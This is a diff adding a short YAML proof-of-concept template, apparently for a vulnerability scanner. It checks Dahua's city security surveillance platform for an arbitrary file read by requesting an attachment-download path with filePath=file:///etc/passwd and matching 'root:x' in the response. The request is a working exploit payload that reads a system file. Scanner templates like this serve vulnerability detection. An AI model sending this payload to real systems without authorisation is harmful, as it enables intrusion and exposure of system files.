@@ -1,0 +1,9 @@
+name: poc-yaml-大华城市安防监控系统平台-Diretory
+description: "任意文件读取"
+method: GET
+path:
+  - /portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
+expression:
+  status: 200
+  body_all:
+    - "root:x"
